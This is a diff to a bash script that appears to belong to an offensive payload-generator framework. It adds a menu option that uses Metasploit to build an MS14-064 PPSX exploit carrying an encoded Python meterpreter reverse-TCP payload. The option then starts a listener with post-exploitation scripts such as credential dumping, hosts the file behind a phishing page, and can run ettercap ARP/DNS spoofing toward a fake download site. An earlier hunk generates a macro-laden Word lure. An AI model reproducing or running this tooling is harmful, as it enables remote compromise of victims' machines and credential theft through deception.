@@ -4612,11 +4612,11 @@ sleep 2
 
 
 # use metasploit to build shellcode
-echo "[☠] Generating the MS_word document .."
+echo "[☠] Generating MS_word document .."
 sleep 2
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; run; exit -y'" > /dev/null 2>&1
 mv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1
-echo "[☠] MS_word: $IPATH/output/$N4m.docm .."
+echo "[☠] MS_word agent: $IPATH/output/$N4m.docm .."
 sleep 2
 
 
@@ -4687,6 +4687,130 @@ rm $IPATH/output/$N4m.exe > /dev/null 2>&1
 rm $ApAcHe/$N4m.docm > /dev/null 2>&1
 rm $D3F/index.html > /dev/null 2>&1
 rm $D3F/$N4m.docm > /dev/null 2>&1
+sleep 2
+clear
+cd $IPATH/
+}
+
+
+
+
+# ---------------------------------------------------------------------
+# ms14_064_packager_python
+# Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013
+# ---------------------------------------------------------------------
+sh_shellcode24 () {
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+
+
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $lport
+| LHOST   : $lhost
+| FORMAT  : PYTHON -> WINDOWS
+| PAYLOAD : python/meterpreter/reverse_tcp
+|_AGENT   : $IPATH/output/$N4m.ppsx
+
+!
+
+   # check if all dependencies needed are installed
+   # check if template exists
+   if [ -e $IPATH/templates/astrobaby.c ]; then
+      echo "[☠] template -> found!"
+      sleep 2
+   else
+      echo "[☠] template -> not found!"
+      exit
+   fi
+
+
+
+# building template
+echo "[☠] editing/backup files .."
+sleep 2
+
+
+# use metasploit to build shellcode
+echo "[☠] Generating MS_word document .."
+sleep 2
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/ms14_064_packager_python; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set FILENAME $N4m.ppsx; set LHOST $lhost; set LPORT $lport; run; exit -y'" > /dev/null 2>&1
+mv $H0m3/.msf4/local/$N4m.ppsx $IPATH/output/$N4m.ppsx > /dev/null 2>&1
+echo "[☠] MS_word agent: $IPATH/output/$N4m.ppsx .."
+sleep 2
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ppsx\n\nchose how to deliver: $N4m.ppsx" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+      sleep 2
+
+
+   else
+
+
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
+
+
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.ppsx|g" mega.html > copy.html
+      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.ppsx $ApAcHe/$N4m.ppsx > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "yes" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        cp $IPATH/output/$N4m.ppsx $D3F/$N4m.ppsx
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+
+        else
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+
+        fi
+   fi
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.ppsx > /dev/null 2>&1
+rm $D3F/index.html > /dev/null 2>&1
+rm $D3F/$N4m.ppsx > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -5019,6 +5143,7 @@ cat << !
     | 21 - shellcode     android      DALVIK         APK          |
     | 22 - shellcode     windows      EXE-SERVICE    EXE          |
     | 23 - shellcode     windows      C              DOCM(word)   |
+    | 24 - shellcode     windows      PYTHON         PPSX(word)   |
     |                                                             |
     |  S - system built-in shells                                 |
     |  F - FAQ (frequent ask questions)                           |
@@ -5055,6 +5180,7 @@ case $choice in
 21) sh_shellcode21 ;;
 22) sh_shellcode22 ;;
 23) sh_shellcode23 ;;
+24) sh_shellcode24 ;;
 S) sh_buildin ;;
 s) sh_buildin ;;
 f) sh_FAQ ;;
